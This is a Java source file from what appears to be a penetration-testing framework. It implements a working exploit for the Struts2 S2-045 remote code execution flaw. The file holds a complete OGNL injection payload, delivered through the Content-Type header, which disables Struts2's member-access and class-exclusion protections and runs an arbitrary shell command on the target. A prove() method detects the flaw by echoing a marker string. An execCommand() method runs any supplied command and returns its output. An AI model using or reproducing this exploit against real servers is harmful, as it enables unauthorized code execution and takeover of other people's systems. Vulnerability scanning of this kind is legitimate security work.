package com.orleven.tentacle.permeate.script;

import java.io.IOException;

import org.apache.http.ParseException;
import org.springframework.context.annotation.Scope;
import org.springframework.stereotype.Component;

import com.orleven.tentacle.core.IOC;
import com.orleven.tentacle.entity.Vulner;
import com.orleven.tentacle.permeate.bean.AssetBean;
import com.orleven.tentacle.permeate.bean.ProveBean;
import com.orleven.tentacle.permeate.script.base.WebScriptBase;
import com.orleven.tentacle.permeate.script.imp.ExecCommandImp;
import com.orleven.tentacle.permeate.script.imp.PrintImp;
import com.orleven.tentacle.permeate.script.imp.ProveImp;
import com.orleven.tentacle.util.WebUtil;

/**
 * Struts2 RCE 045
 * @author orleven
 * @date 2017年3月8日
 */
@Component
public class Struts2RCE045 extends WebScriptBase implements ProveImp,ExecCommandImp{

	private String payload1 = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='";
	private String payload2 = "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";
	private String proveFlag = "The Struts2-045 Remote Code Execution Is Exist!";
	
	public Struts2RCE045(){
		super();
	}
	

	@Override
	public void execCommand(String command) {
		ProveBean proveBean= IOC.instance().getClassobj(ProveBean.class);
		String result = "";
		try {
			getHttpHeaders().put("Content-Type", payload1 + command + payload2);
			result = WebUtil.getResponseBody(WebUtil.httpGet(getTargetUrl(), getHttpHeaders()));
		} catch (ParseException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		} finally{
			proveBean.setReceiveMessage(result);
			proveBean.setSendMessage(command);
			getVulnerBean().getProveBean().add(proveBean);
		}
	}

	@Override
	public void prove() {
		ProveBean proveBean= IOC.instance().getClassobj(ProveBean.class);
		String command = "echo The Struts2-045 Remote Code Execution Is Exist!";
		String result = "";
		try {
			getHttpHeaders().put("Content-Type", payload1 + command + payload2);
			result = WebUtil.getResponseBody(WebUtil.httpGet(getTargetUrl(), getHttpHeaders()));
			if (result.indexOf(proveFlag)>=0) {
				getVulnerBean().setIsVulner(true);
			}else{
				getVulnerBean().setIsVulner(false);
			}
		} catch (ParseException e) {
			result = "An error has occurred !";
			getVulnerBean().setIsVulner(false);
			e.printStackTrace();
		} catch (IOException e) {
			result = "An error has occurred !";
			getVulnerBean().setIsVulner(false);
			e.printStackTrace();
		} finally{
			proveBean.setReceiveMessage(result);
			proveBean.setSendMessage(command);
			getVulnerBean().getProveBean().add(proveBean);
		}
	}

}
